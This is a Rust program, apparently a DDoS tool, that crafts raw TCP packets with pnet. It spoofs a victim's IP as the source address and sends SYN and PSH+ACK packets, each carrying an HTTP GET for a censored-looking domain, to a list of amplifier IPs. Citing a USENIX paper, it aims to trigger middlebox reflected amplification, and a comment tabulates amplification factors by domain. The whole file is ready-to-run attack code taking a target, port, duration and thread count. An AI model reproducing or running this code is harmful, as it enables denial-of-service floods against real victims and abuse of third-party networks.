extern crate pnet;
extern crate rand;

use pnet::datalink::{Channel, MacAddr, NetworkInterface};

use pnet::packet::ethernet::EtherTypes;
use pnet::packet::ethernet::MutableEthernetPacket;

use std::thread;
use std::time::Duration;
use std::{
    env,
    fs::File,
    io::{prelude::*, BufReader},
    net::Ipv4Addr,
    path::Path,
};
use std::process::Command;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::tcp::MutableTcpPacket;
// static mut OUTBOUND_NIC_MAC_ADDR: (u8, u8, u8, u8, u8 ,u8) = (0, 0, 0, 0, 0, 0);
struct PartialTCPPacketData<'a> {
    pub destination_ip: Ipv4Addr,
    pub iface_ip: Ipv4Addr,
    pub iface_name: &'a String,
    pub iface_src_mac: &'a MacAddr,
}

fn lines_from_file(filename: impl AsRef<Path>) -> Vec<String> {
    let file = File::open(filename).expect("no such file");
    let buf = BufReader::new(file);
    buf.lines()
        .map(|l| l.expect("Could not parse line"))
        .collect()
}

fn get_outbound_iface() -> Result<NetworkInterface, &'static str> {
    for nic in pnet::datalink::interfaces().into_iter() {
        match Command::new("/usr/bin/ping")
            .arg("-I")
            .arg(nic.name.clone())
            .arg("-c")
            .arg("1")
            .arg("-W")
            .arg("2")
            .arg("8.8.8.8")
            .output()
        {
            Ok(o) => {
                if String::from_utf8(o.stdout).unwrap().contains("icmp_seq") {
                    return Ok(nic);
                }
            },
            Err(_) => continue,
        };
    }
    return Err("could not find outbound interface!");
}

fn main() {

    let args: Vec<String> = env::args().collect();
    let target_ip = args[1].parse::<String>().unwrap();
    let target_tcp_port = args[2].parse::<u16>().unwrap();
    let time = args[3].parse::<u64>().unwrap();
    let thread = args[4].parse::<i8>().unwrap();
    let amp = args[5].parse::<String>().unwrap(); // such as .txt amp file path

    let amp_vec = lines_from_file(amp.as_str());

    for _ in 0..thread {
        let iface = get_outbound_iface().unwrap();
        let (mut tx, _) = match pnet_datalink::channel(&iface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unknown channel type"),
            Err(e) => panic!("Error happened {}", e),
        };

        println!("starting...");

        let amp_ip_vec_clone = amp_vec.clone();
        let target_ip_clone = target_ip.clone();

        let _handle = thread::spawn(move || loop {
            for amp_ip_addr in &amp_ip_vec_clone {
                let partial_packet: PartialTCPPacketData = PartialTCPPacketData {
                    destination_ip: amp_ip_addr.parse().unwrap(), // ip header+ has been spoofed
                    iface_ip: target_ip_clone.parse().unwrap(),
                    iface_name: &iface.name,
                    iface_src_mac: &iface.mac.unwrap(),
                };

                let ff = rand::random::<u16>();
                let ss = rand::random::<u32>();

                tx.build_and_send(1, 66, &mut |packet: &mut [u8]| {
                    build_random_packet2(&partial_packet, packet, target_tcp_port, ff, ss);
                });

                tx.build_and_send(1, 103, &mut |packet: &mut [u8]| {
                    build_random_packet(&partial_packet, packet, target_tcp_port, ff, ss);
                });
            }
        });
    }

    thread::sleep(Duration::from_secs(time));
    panic!();
}

fn build_random_packet(
    partial_packet: &PartialTCPPacketData,
    tmp_packet: &mut [u8],
    target_tcp_port: u16,
    ff: u16,
    ss: u32,
) {
    const ETHERNET_HEADER_LEN: usize = 14;
    const IPV4_HEADER_LEN: usize = 20;

    {
        let mut eth_header =
            MutableEthernetPacket::new(&mut tmp_packet[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_destination(*partial_packet.iface_src_mac);
        eth_header.set_source(*partial_packet.iface_src_mac);
        eth_header.set_ethertype(EtherTypes::Ipv4);
    }

    {
        let mut ip_header = MutableIpv4Packet::new(
            &mut tmp_packet[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
        )
        .unwrap();
        ip_header.set_header_length(69);
        ip_header.set_total_length(89);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(partial_packet.iface_ip);
        ip_header.set_destination(partial_packet.destination_ip);
        ip_header.set_identification(rand::random::<u16>());
        ip_header.set_ttl(255);
        ip_header.set_version(4);
        ip_header.set_flags(0x00);

        let checksum = pnet::packet::ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }

    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..])
                .unwrap();

        tcp_header.set_source(ff);
        tcp_header.set_destination(target_tcp_port);

        tcp_header.set_flags(0x18);
        tcp_header.set_window(65365);
        tcp_header.set_data_offset(8);
        tcp_header.set_urgent_ptr(0);
        tcp_header.set_sequence(ss + 1);

        tcp_header.set_acknowledgement(rand::random::<u32>());
        /*
        URL SYN PSH PSH+ACK <SYN; PSH> <SYN;PSH+ACK>

        www.youporn.com 49.4 4.4 23.2 13.9 52.0
        roxypalace.com 5.8 4.4 16.5 13.6 31.3
        plus.google.com 7.4 7.0 5.9 13.4 14.9
        bittorrent.com 3.7 3.2 3.8 10.6 13.7
        survive.org.uk 4.4 2.8 2.4 11.0 11.2
        example.com 3.4 2.9 2.8 11.2 8.4
        empty 0.06 0.01 0.02 0.05 0.06

        */
        tcp_header.set_payload("GET / HTTP/1.1\r\nHost: youporn.com\r\n\r\n".as_bytes());
        // https://www.usenix.org/system/files/sec21fall-bock.pdf
        let checksum = pnet::packet::tcp::ipv4_checksum(
            &tcp_header.to_immutable(),
            &partial_packet.iface_ip,
            &partial_packet.destination_ip,
        );
        tcp_header.set_checksum(checksum);
    }
}

fn build_random_packet2(
    partial_packet: &PartialTCPPacketData,
    tmp_packet: &mut [u8],
    target_tcp_port: u16,
    ff: u16,
    ss: u32,
) {
    const ETHERNET_HEADER_LEN: usize = 14;
    const IPV4_HEADER_LEN: usize = 20;

    {
        let mut eth_header =
            MutableEthernetPacket::new(&mut tmp_packet[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_destination(*partial_packet.iface_src_mac);
        eth_header.set_source(*partial_packet.iface_src_mac);
        eth_header.set_ethertype(EtherTypes::Ipv4);
    }

    {
        let mut ip_header = MutableIpv4Packet::new(
            &mut tmp_packet[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
        )
        .unwrap();
        ip_header.set_header_length(69);
        ip_header.set_total_length(52);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(partial_packet.iface_ip);
        ip_header.set_destination(partial_packet.destination_ip);
        ip_header.set_identification(rand::random::<u16>());
        ip_header.set_ttl(255);
        ip_header.set_version(4);
        ip_header.set_flags(0x00);

        let checksum = pnet::packet::ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }

    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut tmp_packet[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..])
                .unwrap();

        tcp_header.set_source(ff);
        tcp_header.set_destination(target_tcp_port);

        tcp_header.set_flags(0x02);
        tcp_header.set_window(65365);
        tcp_header.set_data_offset(8);
        tcp_header.set_urgent_ptr(0);
        tcp_header.set_sequence(ss);

        tcp_header.set_acknowledgement(0);

        let checksum = pnet::packet::tcp::ipv4_checksum(
            &tcp_header.to_immutable(),
            &partial_packet.iface_ip,
            &partial_packet.destination_ip,
        );
        tcp_header.set_checksum(checksum);
    }
}
